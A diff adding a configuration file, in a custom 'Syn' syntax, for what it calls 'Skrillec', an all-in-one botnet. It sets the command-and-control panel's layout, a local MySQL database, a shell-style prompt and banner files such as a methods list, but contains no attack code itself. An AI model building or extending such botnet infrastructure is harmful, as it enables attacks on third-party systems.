@@ -1,3 +1,55 @@
-Net_Info [
-    port = 4333
-]
+
+//
+// Syn Text Format Syntax (Similar to JSON)
+// Comes with a parser module. 
+//
+// Creator: x0tic
+// Since: 10/8/21
+//
+// A Config Control Panel will be coming soon to the NET!
+//
+// New Type of config syntax for storing configuration information
+// Syntax: Fields > Keys > Values
+// 
+// None value means empty!
+//
+Net_Info {
+    net_title = "Skrillec"
+    net_description = "The New 2022 All-In-One Botnet. Eliminating the hassle of looking for all botnet related files to start one up!"
+    net_versoin = "4.0.0"
+    net_port = None
+    access_token = None
+}
+DB {
+    MySQL {
+        host = 127.0.0.1
+        port = 3306
+        username = root
+        dbname = skrillec_net
+    }
+}
+Design {
+    terminal_size = 19,118
+    Hostname {
+        hostname = [Skrillec@root]#~ $ 
+        hostname_position = 18,43
+    }
+    CNC_Output {
+        cnc_output_position = 3,27 // row 3 position 5 
+        output_rows = 9 // the amount of rows for the cnc server box
+        output_width = 30 // the width of character that can fit in a row (it breaks the string at character 50 with a newline)
+    }
+    Chatroom_Output {
+        chatroom_output_position = 0,0
+        output_rows = 0
+        output_width = 0
+    }
+    Banners {
+        // This special syntax isnt gonnah be for the official syn syntax format
+        UI = ui.txt [
+            efig.text = ui_text.txt
+        ]
+        help = help.txt, 
+        methods = methods.txt,
+    }
+}
